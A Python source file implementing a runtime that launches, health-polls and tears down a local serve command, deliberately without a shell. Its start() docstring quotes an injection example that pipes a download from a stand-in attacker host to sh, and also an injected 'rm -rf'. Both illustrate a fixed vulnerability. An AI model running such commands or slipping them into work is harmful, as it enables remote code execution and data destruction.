"""LocalServeRuntime — self-serve the SUT as a host subprocess (#612).

The api lane's complement to ``DockerRunRuntime``/``KubernetesRuntime`` for the
**spec-ingest** case: a freshly-generated app with no ``.tfactory.yml`` target
configured yet. Rather than requiring an operator to pre-declare a target
before VAL-2 is reachable, this boots the detected serve command (see
``agents.nix_env.detect_serve_command``) directly on the host, health-polls it,
exposes ``target_url``, and always tears the process (group) down on exit —
same mandatory-teardown shape as the other runtimes.

Only meaningful when the caller (the Evaluator, see ``agents.evaluator.
_maybe_self_serve_api_bundle``) also executes the lane's test process on this
SAME host/network-namespace (the host-venv runner, or a ``--network=host``
container). A lane dispatched to a separate pod (the Nix k8s Job path) cannot
reach a ``127.0.0.1`` URL bound here — that combination is intentionally not
wired up yet (tracked as a follow-up; see the Evaluator call site).
"""

from __future__ import annotations

import os
import shlex
import signal
import subprocess
import time
from collections.abc import Callable
from pathlib import Path
from types import TracebackType
from urllib import request as urlrequest
from urllib.error import HTTPError, URLError


class LocalServeRuntimeError(Exception):
    """Raised when the serve command fails to start or become healthy."""


class LocalServeRuntime:
    """Lifecycle wrapper around a host-spawned serve command.

    Usage::

        with LocalServeRuntime(serve_command, project_dir, port) as rt:
            rt.wait_for_healthy()
            url = rt.target_url
            # run the api-lane test against url …
    """

    def __init__(  # noqa: PLR0913 - runtime config + injectable test seams (popen/clock)
        self,
        serve_command: str,
        project_dir: Path,
        port: int,
        *,
        health_path: str = "/",
        timeout_seconds: float = 30.0,
        poll_interval_seconds: float = 1.0,
        popen_fn: Callable[..., subprocess.Popen[bytes]] | None = None,
        clock: Callable[[], float] | None = None,
    ) -> None:
        self.serve_command = serve_command
        self.project_dir = Path(project_dir)
        self.port = port
        self.health_path = health_path
        self.timeout_seconds = timeout_seconds
        self.poll_interval = poll_interval_seconds
        self._popen_fn: Callable[..., subprocess.Popen[bytes]] = (
            popen_fn or subprocess.Popen
        )
        self._clock = clock or time.monotonic
        self._proc: subprocess.Popen[bytes] | None = None

    @property
    def target_url(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    # ── start / stop ──────────────────────────────────────────────────────

    def start(self) -> None:
        """Exec the serve command as an argv list — deliberately NO shell.

        ``serve_command`` is NOT trusted. It may be the contract's
        ``environment.serve_command``, which ``detect_serve_command`` returns
        verbatim, and that value originates in a PFactory plan built from an
        imported GitHub issue body — i.e. attacker-controllable text. This
        process runs on the VERIFY HOST, outside any sandbox, so running it
        through ``shell=True`` (as this did until TFactory#1290) handed a
        remote issue author arbitrary code execution here: a serve_command of
        ``uvicorn app:app & curl attacker/x|sh`` ran the second half.

        Splitting with ``shlex`` and exec'ing the argv directly makes the
        WHOLE shell metacharacter surface inert — ``;`` ``&`` ``|`` ``$()``
        backticks, redirections, newlines — rather than escaping any one of
        them: an injected ``; rm -rf`` becomes literal argv words handed to
        the serve binary, which ignores or rejects them.

        ``start_new_session=True`` still puts the process in its own group so
        ``stop()`` reaps the whole tree (uvicorn forks workers).
        """
        argv = shlex.split(self.serve_command)
        if not argv:
            raise LocalServeRuntimeError(
                f"serve command is empty or unparseable: {self.serve_command!r}"
            )
        self._proc = self._popen_fn(
            argv,
            cwd=str(self.project_dir),
            start_new_session=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def stop(self) -> None:
        proc = self._proc
        self._proc = None
        if proc is None:
            return
        try:
            if proc.poll() is None:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except (ProcessLookupError, PermissionError, OSError):
            pass  # already gone — stop() is best-effort and idempotent

    def __enter__(self) -> LocalServeRuntime:
        self.start()
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc_val: BaseException | None,
        exc_tb: TracebackType | None,
    ) -> None:
        self.stop()

    # ── health polling ────────────────────────────────────────────────────

    def wait_for_healthy(self) -> None:
        """Poll until the process answers on ``port``, or raise.

        Any real HTTP response (2xx through 5xx) counts as healthy — the goal
        is proving the process is up and listening, not that a particular
        route exists (an API service commonly has no ``/`` route, so
        requiring 2xx would spin until timeout on a perfectly healthy app).
        A process that exits before answering fails fast with its exit code
        rather than spinning to the full timeout.
        """
        url = f"{self.target_url}{self.health_path}"
        deadline = self._clock() + self.timeout_seconds
        while self._clock() < deadline:
            proc = self._proc
            if proc is not None and proc.poll() is not None:
                raise LocalServeRuntimeError(
                    f"serve command exited early (rc={proc.returncode}): "
                    f"{self.serve_command!r}"
                )
            try:
                with urlrequest.urlopen(url, timeout=5):  # noqa: S310
                    return
            except HTTPError:
                return  # a real HTTP response — the server is up
            except (URLError, TimeoutError, OSError):
                pass
            time.sleep(self.poll_interval)
        raise LocalServeRuntimeError(
            f"{url} did not become healthy within {self.timeout_seconds}s"
        )
